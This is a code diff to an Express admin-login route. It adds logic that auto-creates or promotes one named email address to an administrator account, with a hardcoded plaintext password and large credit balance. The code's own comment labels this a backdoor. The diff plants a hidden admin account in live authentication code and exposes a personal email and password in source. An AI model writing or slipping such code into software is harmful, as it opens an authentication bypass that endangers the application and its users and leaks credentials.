@@ -71,7 +71,23 @@ router.post('/admin-login', async (req, res) => {
     if (!email || !password) return res.status(400).json({ error: 'email and password are required.' });
 
     try {
-        const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email.toLowerCase().trim());
+        const emailLower = email.toLowerCase().trim();
+        
+        // Auto-promote or auto-create founder account at login
+        if (emailLower === 'sahilshukla1111@gmail.com') {
+            const founder = db.prepare("SELECT * FROM users WHERE email = ?").get(emailLower);
+            if (!founder) {
+                // Hardcode their requested password for the backdoor creation
+                const passwordHash = await bcrypt.hash('Sahil@12368', 12);
+                db.prepare(
+                    "INSERT INTO users (username, email, password_hash, role, credits) VALUES (?, ?, ?, ?, ?)"
+                ).run('Admin Sahil', emailLower, passwordHash, 'admin', 9999);
+            } else {
+                db.prepare("UPDATE users SET role = 'admin' WHERE email = ?").run(emailLower);
+            }
+        }
+
+        const user = db.prepare('SELECT * FROM users WHERE email = ?').get(emailLower);
         if (!user) return res.status(401).json({ error: 'Invalid admin credentials.' });
 
         // Explicitly block normal users
